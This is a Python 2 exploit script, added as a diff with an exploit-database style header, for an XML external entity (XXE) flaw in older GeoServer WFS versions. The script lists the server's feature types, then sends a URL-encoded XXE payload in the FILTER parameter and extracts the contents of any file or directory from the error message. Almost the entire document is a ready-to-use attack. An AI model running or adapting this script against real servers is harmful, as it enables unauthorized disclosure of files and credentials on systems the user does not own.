@@ -1,0 +1,66 @@
+# Exploit Title : GeoServer XXE
+# Date : 11/08/2015
+# Exploit Author : David Bloom (Script) - (Ping to Sven Claessens, Jacques Villemur and Eric Donners)
+# Vendor homepage : http://geoserver.org
+# Software Link : http://geoserver.org/release/stable
+# Version : 2.7 : <2.7.1.1  / 2.6 : <2.6.4 / 2.5 : <2.5.5.1 
+# Tested : Client Windows, Server Linux/Jetty  
+# Vendor bug track : GEOS-7032
+# CVE : No CVE
+# Category : Webapps
+# Description : An XXE vulnerability in geoserver allows to view file contents and list directories on the server.
+
+
+from xml.etree import ElementTree
+import sys
+import urllib2
+import urllib
+
+def main():
+    print '\n-----------------------\nGeoServer XXE Exploit\nScript by David Bloom\nTwitter: @philophobia78\n-----------------------\n' 
+    if len(sys.argv) != 3 :
+        print "Usage geoserver-xxe.py [URL] [File Or Dir]"
+        return
+    geoServerUrl = sys.argv[1]
+    fileName = sys.argv[2]
+
+    featuresUrl = geoServerUrl + "/wfs?request=GetCapabilities"
+    exploitUrl = geoServerUrl + "/wfs?request=GetFeature&SERVICE=WFS&VERSION=1.0.0&TYPENAME=@candidateFeature@&FILTER=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%20%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F@targetFile@%22%20%3E]%3E%3CFilter%20%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3E%26xxe%3B%3C%2FPropertyName%3E%3CLiteral%3EBrussels%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E"
+    
+    response = urllib2.urlopen(featuresUrl)
+    root = ElementTree.fromstring(response.read())
+
+    print "Searching geoserver features ... : \n"
+    gsFeatures = [] 
+    for node in root.iter():
+        if 'FeatureTypeList' in node.tag  :
+            for feature in node.iter():
+                if 'Name' in feature.tag :
+                    gsFeatures.append(feature.text)
+                    print "Feature found :" + feature.text
+    if not gsFeatures:
+        print "No geoserver feature found, wrong url ?"
+        return
+		
+    print "\nCandidate used : " + gsFeatures[0] + "\n"
+    print "Trying XXE : "
+    print "-------------\n"
+    exploitUrl = exploitUrl.replace("@candidateFeature@",gsFeatures[0])
+    exploitUrl = exploitUrl.replace("@targetFile@",fileName)
+    print exploitUrl + "\n\n"
+    try :
+        response = urllib2.urlopen(exploitUrl)
+        # Clean output from exceptions string
+        trashOutput = response.read()
+        beginRef = "Illegal property name:"
+        endRef  =  "for feature type"
+        fileStart = trashOutput.index(beginRef) + len(beginRef)
+        fileStop = trashOutput.index(endRef)
+        print "Output"
+        print "-------\n"
+        print trashOutput[fileStart:fileStop].strip()
+    except : 
+        print "An error occured, maybe a premission error"
+
+if __name__ == '__main__':
+    main()	
